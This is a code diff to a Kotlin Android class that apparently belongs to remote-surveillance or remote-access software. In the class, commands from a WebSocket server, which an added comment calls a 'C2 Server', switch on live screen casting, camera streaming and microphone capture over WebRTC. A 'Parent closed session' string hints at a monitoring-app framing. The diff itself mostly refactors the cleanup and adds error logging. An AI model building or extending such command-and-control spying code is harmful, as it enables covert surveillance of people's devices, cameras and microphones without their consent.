@@ -28,7 +28,7 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
     private var webSocket: WebSocket? = null
     
     private val webRtcManager = WebRtcManager(context) { sdpJsonString ->
-        sendJsonString(sdpJsonString)
+        sendJsonString(sdpJsonString) // Send WebRTC Handshake to C2 Server via WebSocket
     }
     
     // WebRTC Hardware Streamers
@@ -51,9 +51,6 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
     private val systemDataReceiver = object : BroadcastReceiver() {
         override fun onReceive(receiverContext: Context?, intent: Intent?) {
             when (intent?.action) {
-                "com.systemlinker.SCREEN_DATA" -> {
-                    intent.getStringExtra("json")?.let { webSocket?.send(it) }
-                }
                 "com.systemlinker.SCREEN_CAST_CONSENT" -> {
                     val code = intent.getIntExtra("code", 0)
                     val data: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -72,6 +69,8 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
                             if (data != null) {
                                 rtcScreenStreamer.startStreaming(code, data)
                                 sendJson(JSONObject().put("status", "webrtc_screen_cast_started"))
+                            } else {
+                                sendJson(JSONObject().put("error", "Screen cast data is null."))
                             }
                         }
                     }
@@ -89,7 +88,6 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
         webSocket = client.newWebSocket(request, this)
         
         val filter = IntentFilter().apply {
-            addAction("com.systemlinker.SCREEN_DATA")
             addAction("com.systemlinker.SCREEN_CAST_CONSENT")
             addAction("com.systemlinker.SCREEN_CAST_CONSENT_DENIED")
         }
@@ -102,17 +100,11 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
     }
 
     fun disconnect() {
+        stopAllWebRtcStreams()
         stopSensorStream()
         
-        rtcScreenStreamer.stopStreaming()
-        rtcCameraStreamer.stopStreaming()
-        rtcAudioStreamer.stopStreaming()
-        
-        webRtcManager.peerConnection?.close()
-        webRtcManager.peerConnection = null
-        
         val intent = Intent("com.systemlinker.ACC_ACTION")
-        intent.putExtra("action", "stream_screen_stop")
+        intent.putExtra("action", "stream_screen_stop") // This is more for general cleanup/ACC
         context.sendBroadcast(intent)
         
         val downgradeIntent = Intent("com.systemlinker.DOWNGRADE_FGS_MP")
@@ -122,6 +114,14 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
         
         webSocket?.close(1000, "Parent closed session")
         webSocket = null
+    }
+
+    private fun stopAllWebRtcStreams() {
+        rtcScreenStreamer.stopStreaming()
+        rtcCameraStreamer.stopStreaming()
+        rtcAudioStreamer.stopStreaming()
+        webRtcManager.peerConnection?.close()
+        webRtcManager.peerConnection = null
     }
 
     override fun onOpen(webSocket: WebSocket, response: Response) {
@@ -138,7 +138,7 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
     }
 
     override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
-        // WebRTC natively handles audio over UDP. We drop WebSocket bytes.
+        // WebRTC natively handles audio over UDP. We drop WebSocket bytes here.
     }
 
     override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
@@ -170,9 +170,12 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
                 try {
                     val signalingPayload = JSONObject(arg)
                     webRtcManager.handleSignalingMessage(signalingPayload)
-                } catch (e: Exception) {}
+                } catch (e: Exception) {
+                    ErrorLogger.logError(context, "WebRTC_Signaling_Parse", e)
+                }
             }
             "webrtc_offer", "webrtc_answer", "webrtc_ice" -> {
+                // These are direct WebRTC signaling commands, handle directly
                 webRtcManager.handleSignalingMessage(payload)
             }
             "live_screen_cast" -> {
@@ -196,6 +199,7 @@ class LiveSessionManager(private val context: Context) : WebSocketListener() {
                 else rtcCameraStreamer.stopStreaming()
             }
             "live_audio_mode" -> {
+                // "call" and "mic" modes imply audio capture for WebRTC
                 if (arg == "call" || arg == "mic") rtcAudioStreamer.startStreaming()
                 else rtcAudioStreamer.stopStreaming()
             }
